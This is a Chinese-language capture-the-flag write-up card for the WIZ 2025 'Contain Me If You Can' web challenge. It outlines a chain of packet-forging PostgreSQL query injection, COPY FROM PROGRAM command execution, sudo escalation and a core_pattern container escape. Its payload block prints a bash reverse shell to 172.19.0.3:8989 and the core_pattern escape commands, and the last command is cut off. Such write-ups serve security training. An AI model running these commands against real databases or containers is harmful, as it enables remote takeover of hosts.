---
title: "WIZCTF · Contain Me If You Can WP"
category: web
tags: ["WIZ 7月云安全挑战", "web", "postgresql_trust_rel", "scapy_tcp_seq_ack", "copy_from_program", "pgsql_rce"]
signals: ["WIZ 7月云安全挑战 2025", "postgresql_trust_rel", "scapy_tcp_seq_ack", "copy_from_program", "pgsql_rce", "container_escape", "core_pattern_escape", "sudo_su_wheel", "tcpdump", "forensic_traffic", "WIZ", "Contain", "You", "Can"]
difficulty: hard
source: "https://www.ctfiot.com/270252.html"
tools: []
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# WIZCTF · Contain Me If You Can WP

> 赛事：WIZ 7月云安全挑战 2025 | 方向：web | 难度：hard

## 一句话总结

WIZ 7月云安全挑战 Contain Me If You Can，Docker 容器内 Scapy 伪造 PostgreSQL TCP 包做预认证 RCE + sudo 提权 + core_pattern 容器逃逸拿宿主机 /flag。

## 攻击链

1. printenv+netstat+ps 信息收集 → tcpdump 抓明文查询 (select now()) → 172.19.0.2 PostgreSQL 5432 预认证信任关系 → Scapy 监听 server→client 包 → 解析 DataRow 字段 → 伪造 TCP 包 src_ip/dst_ip 互换 + seq=ack + ack=seq+len → COPY tmp_output FROM PROGRAM 'cmd' → CREATE TEMP TABLE → SELECT → bash -i 反弹 shell → sudo -l 查 wheel → sudo su 提权 → /proc/sys/kernel/core_pattern 写入反弹 shell base64 → kill -11 触发容器逃逸

## 关键 payload

```
COPY tmp_output FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/172.19.0.3/8989 0>&1"'; / echo '|bash -c ...' > /proc/sys/kernel/core_pattern; sh -c 'kill -11 "$$
```

## 经验教训

PostgreSQL 预认证信任关系 + 明文通信 + COPY FROM PROGRAM 是经典云内网 RCE 组合；core_pattern 反弹 shell 是 Linux 容器逃逸标配。

## 标签

postgresql_trust_rel、scapy_tcp_seq_ack、copy_from_program、pgsql_rce、container_escape、core_pattern_escape、sudo_su_wheel、tcpdump、lateral_movement

## 参考来源

- https://www.ctfiot.com/270252.html
- 原文件：WIZCTF_·_Contain_Me_If_You_Can_WP.full.md
